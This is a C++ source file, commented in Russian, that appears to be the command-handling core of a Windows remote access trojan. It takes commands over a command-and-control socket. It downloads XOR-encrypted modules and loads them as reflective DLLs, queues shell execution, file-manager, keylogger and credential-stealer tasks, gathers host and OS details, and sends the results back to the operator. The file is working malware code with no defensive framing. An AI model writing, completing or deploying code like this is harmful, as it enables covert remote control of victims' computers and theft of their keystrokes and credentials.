#include "commands.h"
#include "loader.h"
#include "network.h"
#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <queue>
#include <map>

extern SOCKET g_c2_socket; // объявлена в нетворке

//У нас есть несколько потоков: основной поток принимает команды и кладёт их в очередь,
//а потоки модулей забирают команды из очереди. 
//Чтобы они не мешали друг другу (не портили данные), мы используем критическую секцию
static CRITICAL_SECTION g_module_cmd_cs;

static std::map<std::string, std::queue<std::string>> g_module_commands; // очередь команд для модуля

static void init_module_commands() { InitializeCriticalSection(&g_module_cmd_cs); }

// кладёт команду в очередь модуля
static void push_module_command(const std::string& module, const std::string& cmd) {
    EnterCriticalSection(&g_module_cmd_cs);
    g_module_commands[module].push(cmd);
    LeaveCriticalSection(&g_module_cmd_cs);
}

// МОдули вызывают, чтобы получить следующую команду для своей очереди
static const char* module_get_command(const char* module_name) {
    static char result[1024] = {0};
    EnterCriticalSection(&g_module_cmd_cs);
    auto it = g_module_commands.find(module_name);
    if (it != g_module_commands.end() && !it->second.empty()) {
        std::string cmd = it->second.front();
        it->second.pop();
        strncpy_s(result, cmd.c_str(), sizeof(result) - 1);
        LeaveCriticalSection(&g_module_cmd_cs);
        return result;
    }
    LeaveCriticalSection(&g_module_cmd_cs);
    return "";
}

// Далее идут две функции, которые передаются модулям в структуре модулапи
static void module_log(const char* msg) {
    OutputDebugStringA("[MODULE] ");
    OutputDebugStringA(msg);
    OutputDebugStringA("\n");
}

static void module_send_result(const unsigned char* data, unsigned long long len) {
    if (g_c2_socket == INVALID_SOCKET) return;
    std::vector<uint8_t> buf(data, data + len);
    push_to_send_queue(buf, 1);
}

//Принимает строку команды и возвращает строку с результатом
std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
    static bool cmds_inited = false;
    if (!cmds_inited) { init_module_commands(); cmds_inited = true; }
    
    if (cmd == "ping") return "pong";

    if (cmd.rfind("LOAD_MODULE ", 0) == 0) {
        std::string module_name = cmd.substr(12);
        std::vector<uint8_t> dll_data;
        if (!download_module(module_name, dll_data)) return "MODULE_DOWNLOAD_FAILED"; //лоадер
        xor_decrypt(dll_data);
        void* modbase = nullptr;
        if (!load_reflective_dll(dll_data, modbase)) return "MODULE_LOAD_FAILED";
        
        static ModuleAPI g_module_api = { module_send_result, module_log, module_get_command };
        if (!execute_module(modbase, g_module_api)) return "MODULE_EXECUTION_FAILED";
        return "MODULE_LOADED_OK";
    }

    if (cmd.rfind("shell_exec:", 0) == 0) { push_module_command("shell", cmd); return "SHELL_COMMAND_QUEUED"; }
    if (cmd == "shell_stop") { push_module_command("shell", "shell_stop"); return "SHELL_STOP_QUEUED"; }
    
    if (cmd.rfind("filemgr:", 0) == 0) { push_module_command("filemgr", cmd); return "FILEMGR_COMMAND_QUEUED"; }
    
    if (cmd.find("keylog") != std::string::npos) { 
        push_module_command("keylogger", cmd); 
        return "KEYLOG_COMMAND_QUEUED"; 
    }

    if (cmd.rfind("steal_", 0) == 0 || cmd.rfind("stealer:", 0) == 0) { 
        push_module_command("stealer", cmd); 
        return "STEALER_QUEUED"; 
    }

    if (cmd == "info") {
        char host[MAX_COMPUTERNAME_LENGTH + 1]; DWORD s = sizeof(host);
        if (!GetComputerNameA(host, &s)) strcpy_s(host, "Unknown");
        ULONG maj=0, bld=0;
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) {
            typedef NTSTATUS (NTAPI* pRtlGetVersion)(void*);
            pRtlGetVersion rv = (pRtlGetVersion)GetProcAddress(ntdll, "RtlGetVersion");
            if (rv) { 
                char buf[512] = {0}; buf[0] = 0x28;
                if (rv(buf) == 0) { maj = *(ULONG*)(buf + 4); bld = *(ULONG*)(buf + 12); } 
            }
        }
        std::string os = (maj == 10 && bld >= 22000) ? "Windows 11 " : "Windows 10 ";
        char buf[256]; sprintf_s(buf, "hostname=%s; os=%s Build %d", host, os.c_str(), bld);
        return std::string(buf);
    }
    if (cmd == "uninstall") return "UNINSTALLING";
    return "UNKNOWN_COMMAND";
}

void process_command(const std::string& cmd, SOCKET sock) { // Нетворк
    std::string res = execute_builtin_command(cmd, sock);
    if (!res.empty()) {
        // Отправляем результат как бинарное сообщение (UTF-8 + '\n')
        std::vector<uint8_t> data(res.begin(), res.end());
        data.push_back('\n');
        push_to_send_queue(data, 1);
    }
}